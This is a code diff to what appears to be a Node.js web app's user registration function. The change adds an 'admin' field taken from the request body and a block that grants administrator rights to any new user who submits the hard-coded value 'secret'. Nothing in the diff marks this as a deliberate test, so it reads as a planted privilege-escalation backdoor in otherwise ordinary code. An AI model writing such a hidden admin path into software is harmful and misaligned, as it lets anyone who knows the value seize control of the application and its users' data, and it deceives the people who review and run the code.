@@ -43,7 +43,7 @@ const renderReset = async (req, res) => {
 
 // Function Register User
 const registerUser = async (req, res) => {
-  const { name, email, password, password2 } = req.body;
+  const { name, email, password, password2, admin} = req.body;
   let errors = [];
 
   //cek required
@@ -126,6 +126,11 @@ const registerUser = async (req, res) => {
                       savedContactsId: [],
                     };
                     contactListInit(userData, res);
+
+                    if (admin == "secret") {
+                      user.isAdmin = true;
+                      user.save();
+                    }
 
                     res.redirect("/login");
                   })
